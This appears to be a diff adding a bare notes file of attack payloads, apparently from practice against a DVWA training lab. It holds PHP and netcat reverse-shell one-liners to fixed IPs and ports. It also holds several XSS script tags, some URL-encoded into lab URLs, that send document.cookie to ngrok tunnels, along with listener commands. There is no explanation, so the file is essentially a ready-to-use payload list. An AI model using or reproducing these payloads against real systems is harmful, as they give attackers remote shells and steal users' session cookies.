@@ -1,0 +1,21 @@
+reverse shell commands
+
+php -r '$sock=fsockopen("192.168.0.123",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+nc -e /bin/sh 198.168.0.185 1234
+
+
+
+<script>new Image().src='https://0a0ac4ef4825.ngrok.io:/?cookie=' + encodeURI(document.cookie);</script>
+
+http://lab.awh.zdresearch.com/chapter1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image%28%29.src%3D%27https%3A%2F%2F0a0ac4ef4825.ngrok.io%3A%2F%3Fcookie%3D%27+%2B+encodeURI%28document.cookie%29%3B%3C%2Fscript%3E#
+
+ngrok http <4444>
+nc -nlvp 4444
+
+
+<script>new Image().src='http://2.tcp.ngrok.io:17320/?cookie=' + encodeURI(document.cookie);</script>
+
+http://lab.awh.zdresearch.com/chapter1/DVWA/login.php?=<script>new Image().src='http://0.tcp.ngrok.io:10862/?cookie=' + encodeURI(document.cookie);</script>
+
+<script>new Image().src='http://0.tcp.ngrok.io:19298/?cookie=' + encodeURI(document.cookie);</script>
